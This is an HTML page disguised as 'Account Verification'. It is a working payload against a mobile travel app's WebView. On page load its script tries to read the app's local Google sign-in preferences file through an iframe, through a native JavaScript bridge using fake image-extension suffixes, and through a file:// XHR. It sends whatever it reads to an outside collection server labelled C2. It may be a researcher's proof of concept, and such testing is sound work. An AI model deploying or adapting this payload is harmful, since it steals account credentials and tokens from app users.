<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        .leak-zone { border: 1px dashed #00ff00; padding: 15px; margin: 10px 0; background: #000; overflow: auto; max-height: 300px; }
        .hidden { display: none; }
        iframe { width: 100%; height: 200px; background: #fff; }
    </style>
</head>
<body>
    <h2>Diagnostics in Progress...</h2>
    
    <div>[#] Attempting Local File Render:</div>
    <div id="display-area" class="leak-zone">Waiting for file content...</div>

    <div>[#] Bridge Gadget Probe:</div>
    <div id="bridge-area" class="leak-zone">Probing...</div>

    <script>
        const C2 = "https://evilios.free.beeceptor.com/exfil";
        const TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";

        function beam(type, val) {
            fetch(C2, {method: "POST", mode: "no-cors", body: JSON.stringify({type: type, data: val})});
        }

        // Method 1: Iframe Scraping (Highest chance of displaying)
        function tryIframe() {
            const ifr = document.createElement('iframe');
            ifr.src = TARGET;
            ifr.id = "targetFrame";
            document.body.appendChild(ifr);

            ifr.onload = function() {
                try {
                    // Try to grab the text content from the rendered XML
                    const content = ifr.contentDocument.body.innerText || ifr.contentWindow.document.documentElement.innerHTML;
                    document.getElementById('display-area').innerText = content;
                    beam("IFRAME_CONTENT", content);
                } catch (e) {
                    document.getElementById('display-area').innerText = "Iframe loaded, but SOP blocked access to content.";
                    beam("IFRAME_SOP_BLOCK", e.message);
                }
            };
        }

        // Method 2: Bridge with Extension Trick
        function tryBridge() {
            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
                // Try to fool the extension check by appending a fake param
                const variants = [TARGET, TARGET + "?.jpg", TARGET + "#.png"];
                let found = false;

                variants.forEach(v => {
                    let res = window.Destination_a.gsImageBase64Str(v);
                    if (res && res !== "null") {
                        document.getElementById('bridge-area').innerText += `Found via ${v}\n\n`;
                        beam("BRIDGE_FILE_READ", res);
                        found = true;
                    }
                });
                
                if (!found) document.getElementById('bridge-area').innerText = "Bridge returned null for all variants.";
            }
        }

        // Method 3: Forced XHR with Protocol Override
        function tryXHR() {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", TARGET, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
                    if (xhr.responseText) {
                        beam("XHR_FILE_READ", xhr.responseText);
                    }
                }
            };
            xhr.send();
        }

        window.onload = () => {
            tryIframe();
            tryBridge();
            tryXHR();
        };
    </script>
</body>
</html>
